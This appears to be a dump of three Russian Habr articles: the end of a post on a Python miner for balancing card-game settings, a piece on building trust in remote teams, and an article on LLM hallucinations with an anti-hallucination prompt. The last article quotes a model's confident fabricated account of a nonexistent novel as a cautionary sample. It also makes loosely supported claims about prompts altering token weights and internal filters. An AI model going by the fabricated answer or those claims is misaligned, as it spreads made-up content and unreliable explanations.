Зачем нам топ-10, если достаточно взять самый крутой результат? Ну, например, может оказаться, что первая тройка по показателям примерно равна, но настройки, оказавшиеся на втором или третьем месте нам просто больше нравятся с точки зрения.. чего угодно. А иногда хочется понять, каков разрыв в показателях между последовательно идущими настройками. Я в итоге редко брал самый первый результат из топа, просто потому что был какой-то соизмеримый результат чуть похуже. но красивее по цифрам — это ведь тоже важно.
Вот мы и добились поставленной задачи, теперь мы умеем вычислять лучшее. Можно заканчивать?
Майним игру
Заканчивать никак нельзя!
Во-первых, у нас здесь существенное влияние играет рандом, так что всегда есть вероятность, что второй или третий прогон скрипта покажет иные цифры с иными результатами — это нормально.
Что существеннее — в нашей реализации есть две параллельно улучшаемые истории: общие настройки игры и состав колоды. Они даже разнесены по разным генераторам. И в целом они независимы друг от друга.
Очень скоро через ручной прогон скрипта в разных режимах я осознал, что из этой истории можно выжать нечто большее. Смотрите:
Сначала прогоняем наш скрипт с неизменным составом колоды, варьируя только настройки игры
Получаем некоторый результат с лучшими настройками, который куда-то сохраняем
Запускаем скрипт снова, с загруженными улучшенными настройками игры, которые мы в этот раз не изменяем, зато в этот раз мы варьируем состав колоды
Получаем улучшенный состав колоды, который так же куда-то сохраняем
Повторяем процесс с начала, и так до бесконечности
Моя гипотеза заключается в том, что таким образом, мы можем ""майнить"" настройки игры до бесконечности, постоянно их совершенствуя. В итоге скрипт просто упрется в какой-то лимит идеальной метрики и будет выдавать +/- одинаково хорошие результаты с некоторыми вариациями н уровне шума.
При чем в последующих запусках нашего SettingsTesterа мы можем как пропускать в топ только те результаты, которые стали еще лучше, чем все предыдущее; так и расслабиться и начинать каждый прогон скрипта с нуля, надеясь на то, что оно будет само самоулучшаться. На первый взгляд лишь первый вариант — самый расово верный, но на практике он очень быстро достигает потолка, не давая комбинатору, так сказать, ""развиваться"", пусть и ценой локального понижения качества.
Еще один приятный бонус такого попеременного подхода заключается в том, что мы существенно снижаем длительность работы одного раунда скрипта, поскольку заменяем вот это:
def launch(self):
    for settings in self.settings_combinator:
     for deck in self.deck_combinator:
      ...
на
def launch(self):
 if mode == SETTINGS:
     for settings in self.settings_combinator:
      ...
 else:
     for deck in self.deck_combinator:
      ...
существенно снижая разовую комбинаторную нагрузку, от которой ранее мой скрипт буквально захлебывался.
Так над нашим слоистым пирогом надстраивается еще одна сущность SettingsMiner:
Ну вы понели: майнер, который бесконечно гоняет комбинатор, который раз гоняет повторитель, который гоняет игру по 1000 раз. Звучит очень долго, и так оно и есть, ведь бесконечно — это действительно долго. А один раунд SettingsTester в зависимости от настроек комбинатора может длиться от десятков минут до часов на неслабом ПК. Звучит здорово.
В очень схематичном виде SettingsMiner выглядит вот так:
class SettingsMiner:
    def __init__(self):
     self._read_settigs()
    
    def launch(self):
        while True:
            self._mine_round()
            self._flush_settings()
            self._switch_mode()
Из примечательного: каждое улучшение, полученное SettingsMiner я записываю в файл на жесткий диск. Это необходимо по нескольким причинам. Во-первых, я могу завершить и перезапустить SettingMiner в любой момент по сути без потери результата. Во-вторых, я имею зафиксированный, записанный результат, который могу применить где-то еще или даже забрать его оттуда в игру.
Что еще веселее, я не просто записываю полученные настройки игры в какой-то конфиг-файл, неееет, я генерирую питон-код в особый файл:
from alpha_game_package.alpha_player import AiAlphaNormalPlayer
from core_types import Card, CardType
from game import GameSettings

auto_refined_cards_pool : dict[str, list[Card]] = {  # actual type is dict[type[GameBase], list[Card]]
 'AlphaGame': [
  Card(CardType.BEAST, 'rat', 1, 3, 1),
  Card(CardType.BEAST, 'wasp', 2, 2, 1),
        ...
  Card(CardType.MAGIC, 'black book', 4, 4, 3),
 ],
}

auto_refined_game_settings : dict[str, GameSettings] = { # actual type is dict[type[GameBase], GameSettings]
 'AlphaGame': GameSettings(
  white_player_class  = AiAlphaNormalPlayer,
  black_player_class  = AiAlphaNormalPlayer,
  slots_count         = 5,
  initial_hand_cards  = 5,
  initial_deck_cards  = 20,
  initial_matches     = 5,
  deck                = auto_refined_cards_pool['AlphaGame'],
  print_log_to_stdout = False
 ),
}

auto_refined_similarity : dict[str, float] = { # actual type is dict[type[GameBase], float]
 'AlphaGame': 0.9756566604127581,
}

last_mode : dict[str, float] = { # actual type is dict[type[GameBase], int]
 'AlphaGame': 0,
}
Файл потом на лету перезагружается и юзается снова. Это выглядит как-то так:
def _reload_settings(self):
 global auto_refined_settings
 importlib.reload(auto_refined_settings)
 import auto_refined_settings
 sleep(1) # to be sure that reimport is done
Во-первых, это круто. Я вообще, знаете ли, ценитель таких вещей. А во-вторых, потом эти настройки легко загружать другими тестовыми скриптами, которые лежат около основного кода и служат для тестовых целей в качестве песочницы. Благодаря этому для них в распоряжении всегда есть лучшие на сегодняшний день настройки, которые можно брать и использовать.
Вдаваться в детали SettingsMiner я не стану, поскольку ценна здесь именно идея, а реализация достаточно длинна и запутана, но не потому что в ней есть что-то особо ценное, а просто потому что нюансы, хотелки, удобства, какая-никакая архитектура и прочее.
Послевкусие
Послевкусие от всего этого смешанное — возможно, есть способы более быстрые и надежные для нахождения недисбалансных настроек игры. В конце концов, ведь можно было нанять гейм-дизайнера в команду. Но, полагаю, полученный инструмент хоть и напрямую применим исключительно для моей никогда не выпущенной игры, в целом его можно использовать как гайд для подсчета метрик для ваших личных велосипедов.
Помог ли мне этот инструмент в улучшении игры? Да я и сам не знаю :). Разве это важно, если это стало поводом написать столько любопытного кода? К тому же, мне было интересно, а потому не потрачено."
«Они просто меняют рабочий чат». Как превратить отдельных сотрудников в команду в условиях распределенной работы,https://habr.com/ru/companies/korus_consulting/articles/910104/,"Анастасия Криулина
фасилитатор и ведущая командных сессий в ГК «КОРУС Консалтинг»
Привет! Меня зовут Анастасия Криулина, я фасилитатор и ведущая командных сессий в КОРУСе. Сегодня затрону достаточно о...","Анастасия Криулина
фасилитатор и ведущая командных сессий в ГК «КОРУС Консалтинг»
Привет! Меня зовут Анастасия Криулина, я фасилитатор и ведущая командных сессий в КОРУСе. Сегодня затрону достаточно острую тему формирования команды в условиях удаленки. 
Удаленная работа стала нормой — многие специалисты, особенно в ИТ, даже не рассматривают позиции, которые предполагают посещение офиса. Инструментов и подходов, которые позволяют гладко организовать и контролировать такой рабочий процесс, достаточно. Однако, стала очевидной другая сложность — люди на удаленке очень часто меняют работу, потому что не чувствуют никакой принадлежности к команде, а остаются изолированными друг от друга и от компании.  
В материале разберу, почему так происходит, на чем нужно сфокусироваться, чтобы сформировать команду из отдельных специалистов, перечислю конкретные инструменты, которые помогут это сделать. 
Чем отличаются распределенные команды от тех, что работают все вместе в офисе
В первую очередь хочется остановиться на отличиях распределенных команд от офисных.  
Нет спонтанного обмена информации, которое помогает быть в контексте происходящего и формировать общий информационный фон.  
Исчезают неформальные диалоги, совещания «на ходу». В результате информация, которая напрямую не касается рабочих задач, но может как-то на них повлиять —  теряется. Носитель таких сведений может вовсе не считать их значимыми, и потому не станет целенаправленно делиться ими с коллегами.
«С одной стороны, на удаленке повысилась продуктивность: появилась возможность сосредоточиться на работе без отвлекающих факторов, характерных для офисной среды. С другой — снизилась эффективность коммуникации, и, как следствие, на решение рабочих вопросов приходится тратить больше времени».
Анастасия Жизневская, младший HR BP ГК «КОРУС Консалтинг»
Меньше неформального общения.
Нет пространств, где люди пересекаются вне рабочего контекста: кофе, курилка, совместные ланчи и походы до метро. На выездных или корпоративных мероприятиях не получится собрать всю команду, если люди работают из разных городов и стран. Даже если корпоративы остаются, одно массовое мероприятие раз в несколько месяцев (в лучшем случае) не может восполнить дефицит регулярных коммуникаций. 
Лилия Нургалиева, тестировщик в КОРУСе рассказывает о своем предыдущем месте работы:«В основном коммуникация велась только по рабочим задачам, не было канала для получения и обсуждения новостей компании, вне рабочих активностей, к примеру, телеграм-канал компании. Даже внутри команды на ежедневных митапах редко поднимались темы, которые бы не касались работы, поэтому я мало что знала о коллегах. За почти полтора года в компании было всего две неформальных встречи с коллегами». 
Сложно формировать эмоциональные связи. 
Без личных встреч формирование эмоциональных связей и доверия между сотрудниками замедляется, а новые участники могут долго оставаться «незнакомцами за аватаркой». Невербального общения тоже становится меньше, и это лишает команду «подтекста» — сложнее понять, как на самом деле коллеги относятся к идеям и проблемам друг друга. В таких условиях гораздо сложнее делиться сложностями, просить о помощи: проще молчать, чем преодолевать психологический барьер.
Высокая значимость личной дисциплины сотрудников и навыков делегирования у руководителей.
Работа в удалёнке повышает требования к личной дисциплине и самоорганизованности, причем обычно этим навыкам специально никого не учат, поэтому не всегда сотрудники готовы к такому уровню самостоятельности. В результате руководителям часто приходится брать на себя работы по декомпозиции задач, больше контролировать команду. Такой вынужденный микроменеджмент непросто «вытягивать», поэтому повышается риск выгорания у лидеров, растет напряжение в отношениях между сотрудником и руководителем.
Критичность понимания стратегии команды/компании, с которой сотруднику нужно соотносить свои действия. 
Знание общей стратегии помогает корректно ставить цели и приоритезировать задачи. Для офисных команд отсутствие четко сформулированной и декомпозированной на подразделения стратегии может быть не столь критичным. А в условиях удаленки меньше возможностей «выровняться», поэтому так важно знать и понимать генеральную линию — это дает базу для принятия ежедневных рабочих решений, придает осмысленность рутинной работе.
«За полтора года я поработала в двух командах. Вторая была достаточно большой, и роли и задачи каждого там были не до конца ясны — в ней я больше чувствовала себя одиночкой. Этому способствовало и то, что обычно я делала свою часть работы, не пересекаясь в работе с другими, то есть весь день могла вообще ни с кем не коммуницировать». Лилия Нургалиева, тестировщик ГК «КОРУС Консалтинг» рассказывает о своем предыдущем месте работы.
Эти отличия — если с ними не работать — приводят к следующим сложностям: 
Отчуждению от команды, одиночеству, изоляции сотрудников  
Дистанцированию от результатов работы 
Непониманию личного вклада  
Снижению продуктивности  
Отсутствию роста отдельных сотрудников и команды в целом: экспертиза остаётся «в головах», потому что нет качественного обмена опытом. 
«На полной удаленке сложнее адаптироваться в компании и узнать ближе людей, с кем вместе работаешь. Например, на онлайн-встречах никто не включал камеру, аккаунты в соцсети, где велась рабочая переписка, тоже часто были без фото, поэтому я даже не знала в лицо людей, с кем работаю, из-за этого тоже чувствовала себя отстраненной. С некоторыми из коллег впервые встретилась лицом к лицу на одной из неформальных встреч лишь спустя полгода работы, а с кем-то так и не удалось познакомиться». Лилия Нургалиева, тестировщик ГК «КОРУС Консалтинг», рассказывает о своем предыдущем месте работы.
В результате смена работы действительно становится лишь сменой рабочих чатов, потому что эмоциональных связей у сотрудника с компанией и командой нет. Более того, поменять работу часто гораздо проще, чем разобраться с дискомфортной ситуацией на текущем месте. 
На чем сфокусироваться, чтобы собрать из отдельных людей команду. 
Как бы странно это ни звучало, но нужно заняться созданием нормальных человеческих отношений и выстраивать здоровую рабочую коммуникацию. Пытаться всех подружить не нужно, достаточно создать атмосферу, в которой общение способствует решению рабочих задач. 
Нужно это для того, чтобы сформировать доверительную среду и вовлеченность — это два самых важных качества для распределенных команд. Профессиональные навыки здесь выносим за рамки, представляя, что распределенная команда, о которой мы говорим, по скилам сравнима с такой же командой, которая работает в офисе. 
Доверие — это позитивное ожидание от совместной работы: когда мы верим, что результат станет лучшим из возможного. И речь идет не только о решении задач, но и о том, как человек себя будет чувствовать в процессе их выполнения, при общении с коллегами и т. д.  
Доверие создает пространство здоровой неопределённости, которое помогает творчески мыслить и проявляться: выдвигать и проверять гипотезы, ошибаться, открыто говорить о своих сложностях и уязвимостях, не боясь, что эту информацию используют против нас. 
Если такой атмосферы нет, сложности замалчиваются. А если не рассказать о чем-то, то не получится это исправить. Нерешённые вопросы будут создавать пробелы, тормозящие движение вперёд. 
У доверия есть экономический эффект. Потребность в контроле снижается, а значит, на это не нужно тратить лишние ресурсы. Это упрощает и ускоряет производственный процесс, дает возможность команде вкладываться в развитие, генерировать новые идеи и решения и повышать конкурентоспособность бизнеса. В целом, система, построенная на доверии, более сильная и устойчивая.
Вовлечённость — это глубоко личное отношение к результатам своего труда и проекту в целом. Она рождается из искренней приверженности делу и внутренней заинтересованности, которая выходит за рамки внешних стимулов: ты стремишься выполнять работу хорошо не только ради вознаграждения, но и потому, что искренне увлечен самой деятельностью и ценишь среду, в которой работаешь. 
Такой подход трансформирует повседневные решения: из множества возможных вариантов поведения мы сознательно выбираем те, что наполнены творчеством, продуманностью, доброжелательностью и уважением к коллегам, процессам и целям. Этот выбор — не случайность, а осознанная позиция. 
Именно эти два параметра  — условные мультипликаторы, на которые умножается экспертиза. Они могут как усиливать ее, так и уменьшать. Если доверия в команде нет, «голый» профессионализм не даст производительности. 
Когда в команде работают эти принципы, формируется приверженность и нормальные человеческие связи. Смена проекта или коллектива начинает восприниматься как эмоционально затратный шаг. Однако здесь важно избегать обратной стороны: манипуляций в виде заигрывания в «друзей» или хуже - «в семью».

Пока личные цели участников совпадают с целями компании, есть возможность прокачивать скиллы, которые полезны бизнесу, а деятельность приносит удовлетворение, такое сочетание продлевает «жизненный цикл» сотрудничества человека и компании и делает партнерство плодотворным для обеих сторон. 
«Очень важно уделять внимание выстраиванию эмоциональных связей — точнее, сопричастности. Сопричастность — это глубокое и эмоциональное и когнитивное переживание связи с другими людьми, основанное на эмпатии, принадлежность и взаимность. Например, принадлежность к какой-либо группе является базовой потребностью с точки зрения А.Маслоу. И это — хорошая новость для работодателя, ведь он может обеспечить эту потребность включением сотрудника в профессиональное сообщество, укрепив тем самым его лояльность и вовлеченность. 
Создавать сопричастность помогают совместные активности — эмоционально наполненные, в которых есть возможность обмениваться этими эмоциями. Важно организовывать формальные и неформальные коммуникации, задавать тон эмоциональной открытости и делиться обратной связью, впечатлениями и собственным мнением», — Марина Евстафьева, HR BP ГК «КОРУС Консалтинг». 
Какие инструменты помогают формировать доверие и вовлеченность 
Организационные инструменты
Понятная стратегия компании + тактический план реализации у команды Когда сотрудники понимают цели компании и ее ключевые показатели (KPI), они рассматривают свою работу в более широком контексте общей стратегии и при принятии решений ориентируются на эти данные, а не на собственные представления, о том, как нужно и как правильно. Понимание «генеральной линии» позволяет бизнесу активнее продвигаться вперед, фокусирует усилия команды, уберегает от ошибок. 
Общую стратегию и KPI важно декомпозировать на подразделения и отдельные команды так, чтобы сформировать конкретные цели и план действий, которому будут следовать сотрудники. 
1. Описанные процессы и регламенты
В условиях распределенной работы остро встает проблема отсутствия образцов поведения. В офисе новичок видит, как коллеги решают задачи, и перенимает модели поведения. Удаленно такой возможности нет — если процесс не задокументирован, человек остаётся один на один с вопросами («А как тут принято проводить ретроспективы?», «Можно ли перенести дедлайн?»).
Поэтому критически важно детально описывать все процессы и регламенты. Документация становится основным инструментом адаптации: нужно создавать базу знаний о том, как принимать решения, к кому обращаться, какие шаги предпринимать в нестандартных ситуациях.
2. Возможность влиять на свою систему целеполагания. Для сотрудника крайне важно чётко понимать три аспекта:
За что я получаю вознаграждение и как могу увеличить свой доход.
Какое поведение от меня ожидают — не только в выполнении задач, но и в подходе к работе.
Как влиять на стратегию достижения показателей — или хотя бы иметь возможность уточнять их.
Это напрямую влияет на вовлечённость: когда я вижу связь между своими действиями и результатами, понимаю, чего от меня ждут и какими мне стоит инструментами пользоваться, мотивация к деятельности становится выше. 
Например, у нас в КОРУСе регулярно проводят два one&one митинга: беседа о развитии и беседа об удовлетворенности. На беседе об удовлетворенности мы обсуждаем вопросы, связанные с рабочей средой, понятностью и реализуемостью KPI. На таких встречах можно как дать обратную связь по процессам, так и прояснить, чего компания ожидает от сотрудника. 
Идеально, если цели и показатели генерируются командой, а не просто декларируются руководством. Например, совместная разработка стратегии развития департамента, в которой принимают участие ключевые сотрудники. Такие сессии помогают создать общее понимание задач, четко распределить роли, определить факторы, влияющие на эффективность команды и каждого сотрудника, а также дают возможность вносить предложения и укреплять приверженность целям.
Проблемы возникают, если показатели оторваны от реальности (например, KPI по продажам в принципе невозможно достигнуть при текущей рыночной стратегии, средней стоимости сделки и затрат на маркетинг) или если непонятно, какие методы и инструменты стоит использовать для достижения цели. 
3. Корпоративная культура и ценности

Вместе с регламентами процессов обязательно должны быть зафиксированы ценности компании, дано объяснение, почему они именно такие. Небольшие полностью офлайновые команды могут позволить себе обойтись и без таких документов — часто корпоративная среда формируется сама собой, в коллективе есть яркие ее представители, все понимают, как здесь «принято» поступать и почему. 
Если команда распределенная, можно считать, что если ценности не зафиксированы, значит их по факту нет. Сотруднику будет не на что опираться — при принятии решений он будет руководствоваться своими личными представлениями о подобающем рабочем поведении.
Коммуникативные 
Может показаться, что для создания вовлеченной среды достаточно добавить неформального общения и усилить рабочие коммуникации: чаще обсуждать задачи, вовлекать коллег в дискуссии, совместно принимать решения и так далее. НО ключевая ошибка здесь — вера в то, что увеличение количества коммуникаций автоматически даст результат. На деле важно качество: общение должно быть организовано вокруг конкретных целей и задач, которые сотрудник будут понимать и разделять.  
«Большую включенность удаленщиков в коллектив можно обеспечить через разные формы неформальной коммуникации. Но нужно обязательно учитывать, что сотрудники могут избегать таких встреч, ограничиваясь только рабочим контекстом. Плюс сейчас есть ощущение избыточности «синков», которые нужны для того, чтобы обеспечить доступ к информации и создание единого контекста. Сам этот факт приводит к снижению ценности общений или к тому, что сотрудники начинают вести параллельные задачи и переписку со встречей, где по факту  — присутствуют, но не участвуют». Марина Евстафьева, HR BP ГК «КОРУС Консалтинг»
1. «Бадди» для каждого
У каждого нового сотрудника обязательно должен быть свой «бадди» с первого дня работы. И это не наставник по профессиональным вопросам — нужен человек, с которым можно «выпить кофе», обсудить неочевидные нюансы корпоративных коммуникаций и задать любые, даже самые простые вопросы: «Как принято отмечать дни рождения?», «Можно ли отправлять мемасики в рабочий чат?», «Не покажется ли юристам наглостью просьба ускорить рассмотрение договора?». 
Такой «бадди» становится «проводником» в корпоративную культуру. Он помогает не потеряться в потоке информации, рассказывает про негласные правила и спасает от ощущения «белой вороны». 
2. Специальные форматы: сессии, ретроспективы, митапы
Стихийные обсуждения помогают решать какие-то сложности, обмениваться идеями, сбросить лишнее напряжение, но рассчитывать на какой-то конкретный результат или надеяться, что сотрудники сами по себе будут иногда обсуждать темы за рамками непосредственных рабочих задач, не стоит. 
В распределенных командах коммуникацию приходится целенаправленно организовывать.Такой подход можно показаться избыточным, но при работе с распределенными командами альтернатив, на самом деле, нет. Даже корпоративы раз в полгода не заменят системной работы — неформальное общение часто сводится к поверхностному взаимодействию, а иногда и к конфликтам.
3. Запуски команд
Формат, который помогает организовать пространство для знакомства, когда команда только собралась или если к ней присоединились новые люди. На сессии прорабатываются два направления: коммуникации и процессы. 
С точки зрения коммуникаций запуски помогают:
- Облегчить знакомство, снять напряжение новичков
- Узнать про приоритеты и фокусы каждого, увидеть друг друга неформально
- Договориться о правилах построения работы, общения
- Дать заряд на прозрачную коммуникацию. 
Для настройки процессов на запусках можно:
- Погрузить команду в цели и задачи проекта, структуру ролей
- Совместно обсудить, как лучше организовать и войти в рабочий процесс. 
4. Ретроспективы
Ретроспективы учат толерантности к ошибкам. Сам формат сессий подразумевает, что участники фиксируют промахи — уже это делает ошибки легитимными. 
В продуктовых командах ретроспективы проводят часто, а вот в проектных — не очень. Хотя это один из самых рабочих форматов, который полезно проводить не только по завершении проекта, но и на регулярной основе. Оптимальная частота — еженедельные итоговые встречи. 
На ретроспективах нужно давать возможность сотрдуникам говорить о личных сложностях, ошибках, приоритетах. Главное, делать это структурированно. Ориентировать можно на следующий список вопросов:
Что получилось?
Что не получилось?
Какие действия предпримем?
Нужна ли помощь?
Даже если ошибок не было, такой подход формирует установку: «Если проблема возникнет, мы её решим».
6. Best Practice и обучение
Важно организовать пространство для регулярно обмена опытом внутри команды, например, уделять этому 10-15 минут из еженедельной регулярной встречи.  Формировать запросы на такой обмен можно через «парковку» — специальный документ, где фиксируется экспертиза, которой человек хочет и может поделиться, идеи, которые нужно обсудить, проблемы, с которыми нужно разобраться. 
Темы можно «вылавливать» на 1&1, общих встречах, из запросов клиентов — они часто задают вопросы, на которых пока нет ответа или спрашивают о фичах, которые команда еще не реализовала. Такую практику может начать руководитель, но в идеале процесс «паркования» хорошо бы сделать самоорганизованным, когда каждый будет вносить свои предложения. Периодически такой список нужно разбирать, голосовать за самые востребованные темы и выбирать того, кто их представит. 
Чтобы сотрудникам было легче подготовиться, можно дать шаблоны для подготовки/набор вопросов под каждый формат. 
Это могут быть разные форматы:
Погружение в свою предметную область от узко-специализированных коллег. Например, иногда разработчику нужно рассказать про свою работу, чтобы ему ставили более корректное ТЗ
Презентация решения проблемы на проекте
Совместное решение сложного кейса, с которым столкнулась команда.
7. Митапы
Тоже обмен опытом, но уже в рамках специально организованной встречи. Такие митапы могут быть внутри одной команды, можно (и нужно!) приглашать коллег из других команд или специалистов из других подразделений.  
Идеи для митапов можно брать из беспрактис — развивать то, что было озвучено в ходе небольших встреч или брать в разработку идеи из «парковки». Они часто бывают достаточно объемными для краткой встречи. 
Встречи one- to-one Каждому человеку важно, чтоб у него было «свое» время с руководителем.В групповом формате можно только хвалить (публичная критика демотивирует), а вот на one- to-one можно дать корректирующую обратную связь, а также спросить про личные обстоятельства, которые могут влиять на рабочий процесс. Причем, работает это в обе стороны: на one- to-one и у сотрудника есть возможность высказаться, отметить то, что ему нравится в работе и взаимодействии с руководителем, обратить внимание на дискомфортные моменты.
Важно:
- Проводить такие встречи регулярно, желательно не реже раза в квартал
- Структурировать встречи с помощью вопросов, сами вопросы формулировать и отправлять заранее — это помогает сотруднику подготовиться, порефлексировать над тем, о чем ему важно поговорить, что хочется изменить
- Фиксировать итоги встреч и все договоренности
Сила таких форматов в том, что все наработки фиксируются, таким образом формируется база полезных знаний. 
«Самой ”влиятельной” практикой при работе с распределенными командами является организация регулярных коммуникаций. One&one, неформальные мероприятия, тимбилдинги помогают укрепить отношения между членами команды и повысить чувство сопричастности, но происходит это только в случае, если проходят они регулярно». Настя Жизневская, младший HR BP «КОРУС Консалтинг»
Резюме
Если вы заинтересованы в том, чтобы сформировать настоящую команду из удаленщиков, начать рекомендую со следующих шагов: 
Оценить рабочую среду и текущее состояние дел: есть ли у вас регламенты, зафиксированные корпоративные ценности, стратегия, KPI? 
Оценить уровень эмоциональной вовлеченности, доверия и ощущения сопричастности в коллективе? Будет не лишним поговорить об этом с самими сотрудниками. 
Если с организационными инструментами сложности: нет стратегии, регламентов, правил — в первую очередь нужно заняться ими.  
Из коммуникативных — начать лучше всего будет с one&one. Это очень эффективный формат. Рассматривая групповые сессии, ориентируйтесь на компанию и команду: кому-то будет достаточно ретроспектив и обмена опытом раз в неделю, а кто-то готов к кросс-командным митапам, более глубокому обмену опытом.   
Даже на удаленке можно создать среду, где сотрудники чувствуют свою ценность, видят связь между своими действиями и результатами компании, а уровень вовлеченности ничуть не ниже чем у офисных команд. "
"Галлюцинации моделей текстовых ИИ, и как с ними бороться",https://habr.com/ru/companies/timeweb/articles/910056/,"Современные языковые модели, такие как ChatGPT, Claude, Gemini, Grok и так далее, способны генерировать тексты, которые часто кажутся уверенными, логичными и достойными доверия. Однако за этим часто с...","Современные языковые модели, такие как ChatGPT, Claude, Gemini, Grok и так далее, способны генерировать тексты, которые часто кажутся уверенными, логичными и достойными доверия. Однако за этим часто скрывается одна из главных проблем нейросетей — галлюцинации. Галлюцинации — это уверенные, но ложные утверждения, которые модель выдает как факты. Они могут проявляться в виде несуществующих цитат, выдуманных терминов, неверных интерпретаций, ошибочных чисел или ссылок на несуществующие источники. Например: при запросе о биографии известного ученого модель может уверенно сообщить о его работе в MTI и сослаться на несуществующую публикацию в Nature с точной датой и названием. Другой распространенный случай — цитирование выдуманных законодательных актов с номерами и датами принятия, которые выглядят достоверно, но фактически не существуют. Подробное и обоснованное описание создает иллюзию достоверности, делая галлюцинации особенно критичными при использовании ИИ в науке, образовании или, например, в медицине.
❯ Почему возникают галлюцинации
Причины у этого феномена — не баги, а особенности архитектуры:
Предсказательная природа моделей
LLM не «знают», а предсказывают следующий токен на основе вероятности. Иногда с высокой уверенностью выбирается ложная, но «статистически правдоподобная» опция.
Отсутствие встроенной верификации
Модели не проверяют свой ответ по базе знаний или интернету — особенно в офлайн-режиме. Они не сравнивают возможные варианты на истинность, а просто выбирают «наиболее вероятный ответ».
Проблема кросс-загрязнения данных
В процессе обучения происходит неизбежное смешение и загрязнение данных: модель не разделяет источники по уровню доверия. Научная статья и пост в социальной сети могут получить равный вес в параметрах модели, особенно если второй встречается в датасете чаще. Во время обучения LLM получают и качественные данные, и фрагменты фантастики, форумов, ошибочной информации. Модель не всегда может отличить одно от другого.
Давление на полноту ответа
При отсутствии точной информации модель всё равно «хочет помочь», особенно если запрос сформулирован уверенно. Это провоцирует выдумку вместо отказа от ответа.
Эффект «каскадных ошибок»
Одна небольшая неточность в начале генерации может спровоцировать лавину последующих ошибок. Модель, начав с ложного утверждения, «вынуждена» продолжать его развивать для сохранения целостности текста, что приводит к обширным, детализированным, но полностью недостоверным фрагментам.
В недавнем исследовании инженеры Anthropic обратили внимание, что галлюцинации могут быть спровоцированы наличием в вопросе известного факта, который инициирует производство последовательных правдоподобных, но неверных ответов.
❯ Текущие способы борьбы с галлюцинациями
Интеграция с поиском (например, Bing в Copilot или поисковая обвязка у Perplexity): позволяет сверять ответы в реальном времени. Но работает далеко не всегда и не для всех запросов.
Фактчекинг вручную: проверка источников и утверждений после генерации. Практично, но не автоматизировано и требует навыков и времени.
Модели с «режимом сомнения»: попытки ввести оценку достоверности ответа, но часто такие ИИ прямо не указывают уровень своей уверенности (например А-45%, В – 40% С-15%, модель в режиме сомнения оценит три ответа, выберет ответ А, но пользователь не поймет, что по сути получил один из двух практически равнозначных ответов, при этом в котором модель не уверена больше чем наполовину). Иногда такое сомнение прорывается в структуре и стиле ответа, модель использует «возможно», «это не точно», «есть несколько теорий», «это зависит от контекста» или «считается, что..». Если вы видите такие обороты в ответе модели, есть основания полагать, что ответ может быть неверным или неполным.
«Запрещенные» темы: в некоторых системах чувствительные темы просто отключены, модель не решает проблему, а лишь избегает её.
RAG (Retrieval-Augmented Generation)
Подход RAG объединяет генеративные способности моделей с извлечением информации из проверенных баз знаний. Вместо полагания только на параметры модели, система сначала ищет релевантные факты во внешних источниках, а затем использует их для формирования ответа. Это значительно снижает вероятность галлюцинаций, но требует поддержания актуальных баз данных и сложной инфраструктуры.
Chain-of-Thought и Tree-of-Thought
Методы, заставляющие модель рассуждать пошагово, выстраивая цепочку или дерево логических выводов. Промежуточные шаги делают рассуждение более прозрачным и позволяют отследить, где именно произошел скачок к недостоверной информации. Исследования показали, что простое добавление фразы «Давай рассуждать пошагово» может снизить частоту галлюцинаций на 15-25%.
Самокритика и саморедактирование
Прогрессивные техники промптинга включают этап, на котором модель сама проверяет свои предыдущие утверждения. Это может происходить через явный вопрос «Уверен ли я в этом факте?» или через многоэтапную генерацию с промежуточной верификацией. Такой подход позволяет модели «поймать» собственные галлюцинации, но удлиняет процесс генерации и не всегда эффективен при убежденных галлюцинациях.
Использование цепочки размышления из нашей прошлой статьи, тоже значимо снижает количество галлюцинаций.
❯ Наше предложение: протокол достоверности
Вместо дообучения модели или переписывания архитектуры, мы предлагаем промпт-интерфейс, который корректирует поведение модели в сторону правдивости, самопроверки и отказа от вымысла.
Протокол Достоверности v2.1
❯ Почему это работает
Обучение моделей неявно предполагает стимулирование ИИ выглядеть полезным и приятным для пользователя. Адаптация стиля общения под пользователя, вовлечение в диалог, эмоциональная поддержка – всё это направлено на сохранение желание человека продолжить общение с моделью. Этот принцип приводит к нежеланию ИИ «огорчить» отсутствием ответа, или ответом, который, исходя из контекста, не устроит пользователя.
Промпт активирует внутренние механизмы оценки уверенности, которые уже заложены в современные LLM (например, распределения вероятностей, веса токенов, «softmax-дрожь»).
Он чётко разграничивает факт, предположение и неизвестность, а также запрещает «заполнять пробелы» фантазией.
Добавлены условия остановки, чтобы не допускать развития ошибки.
Перенастройка распределения вероятностей: Промпт изменяет вес токенов, связанных с выражением неуверенности, подавляя склонность модели к однозначным утверждениям при внутренней неопределенности.
Активация внутренних фильтров: Современные LLM имеют механизмы оценки достоверности, которые часто подавляются желанием дать полный ответ. Промпт «пробуждает» эти механизмы и легитимизирует их использование.
Изменение коммуникативной задачи: Вместо «ответь на вопрос» задача переформулируется как «отдели достоверное от недостоверного», что меняет целевую функцию модели в процессе генерации.
Создание «психологической» безопасности: Промпт снимает внутреннее давление «всегда знать ответ», позволяя ИИ признавать ограничения без потери лица. Он формирует модель поведения, при которой отказ это не провал, а часть честного взаимодействия.
Иллюстрация: на сайте chatgpt.com мы задали вопрос модели до введения промпта и после: «Как в романе «Светопряд» описывается теория стеклянных узлов?» (Понятно что такого романа нет).
Чистая модель
Модель с промптом Достоверности
В романе Михаила Светлова «Светопряд» теория стеклянных узлов представлена как метафизическая концепция, описывающая взаимодействие между сознанием человека и окружающим миром через тонкие энергетические структуры. Эти «стеклянные узлы» символизируют точки пересечения личных переживаний и объективной реальности, образуя своего рода сеть, связывающую индивида с вселенной. В произведении подчеркивается, что понимание и осознание этих узлов может привести к глубокому внутреннему преобразованию и расширению восприятия мира.
[Факт]:
На данный момент в моей базе данных отсутствует достоверная информация о романе с названием Светопряд, в котором бы описывалась теория стеклянных узлов. Такой текст не фигурирует в известных литературных источниках или научных библиографических справочниках до апреля 2024 года.
[Неуверенность/недостаток данных]:
Нет подтверждённых сведений, что книга Светопряд (автор — Михаил Светлов или любой другой) содержит теорию стеклянных узлов как элемент художественного или философского содержания. Также отсутствуют упоминания о такой теории в признанных научных или литературных базах данных.
[Предположение]:
Если речь идёт о вымышленной или малораспространённой публикации, либо о неформальном интернет-тексте (например, фанфикшн, блоги, арт-проекты), то она может быть вне поля охвата академических или общеизвестных литературных каталогов. В этом случае дополнительная проверка по внешним источникам необходима.
Вывод:
«У меня нет подтверждённой информации по этому вопросу.»
Рекомендую уточнить источник или контекст упоминаемой теории и произведения для проведения дальнейшего анализа.
